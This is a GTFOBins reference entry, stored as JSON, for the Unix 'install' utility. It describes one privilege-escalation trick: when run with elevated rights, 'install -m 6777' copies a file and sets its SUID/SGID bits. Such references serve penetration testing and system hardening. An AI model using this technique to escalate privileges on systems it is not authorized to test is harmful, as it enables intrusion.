{"title": "install", "source": "gtfobins", "source_label": "GTFOBins", "path": "install", "html": "<h1>install</h1>\n<h2>Privilege Escalation</h2>\n<p>This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.</p>\n<pre><code class=\"language-bash\">install -m 6777 /path/to/input-file /path/to/output-dir/</code></pre>", "excerpt": "install Privilege Escalation This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file. install -m 6777 /path/to/input-file /path/to/output-dir/", "tags": ["func:privilege-escalation", "ctx:sudo", "ctx:suid"]}